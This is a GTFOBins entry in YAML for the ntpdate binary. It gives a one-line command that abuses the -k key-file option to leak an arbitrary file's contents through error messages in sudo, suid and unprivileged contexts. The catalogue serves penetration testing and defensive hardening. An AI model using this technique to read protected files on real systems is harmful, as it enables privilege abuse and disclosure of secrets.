<!-- source: https://github.com/GTFOBins/GTFOBins.github.io/blob/acd524623f9c406acedd2754ebd9c2431f3675ad/_gtfobins/ntpdate -->
---
functions:
  file-read:
  - binary: false
    code: |-
      ntpdate -a x -k /path/to/input-file -d localhost
    comment: |-
      The file is actually parsed and lines are leaked through error messages.
    contexts:
      sudo:
      suid:
      unprivileged:
...
